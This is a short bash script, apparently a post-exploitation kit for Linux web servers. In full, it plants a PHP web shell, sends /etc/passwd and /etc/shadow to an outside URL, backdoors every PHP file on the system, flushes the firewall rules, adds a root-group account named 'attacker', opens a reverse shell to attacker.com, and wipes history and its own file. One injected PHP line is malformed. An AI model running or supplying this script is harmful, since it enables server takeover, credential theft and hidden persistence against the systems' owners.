#!/bin/bash

# Create web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Exfiltrate sensitive files
curl -F 'file=@/etc/passwd' http://raw.githubusercontent.com/SurrealSatires/SurrealSatires.com/refs/heads/main/exfil.php
curl -F 'file=@/etc/shadow' http://raw.githubusercontent.com/SurrealSatires/SurrealSatires.com/refs/heads/main/exfil.php

# Inject malicious payload into all PHP files
find / -type f -name '*.php' -exec sed -i '1s/^<?php/<?php\nif(isset($_GET[0xCMD])){system($_GET[0xCMD]);}/' {} \;

# Disable firewall
iptables -F
iptables -X
iptables -t nat -F
systemctl stop firewalld 2>/dev/null

# Create persistence user
useradd -m -s /bin/bash -G root,sudo attacker
echo "attacker:password123!" | chpasswd

# Establish reverse shell persistence
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &

# Clean traces
history -c
rm -f /tmp/bd.sh
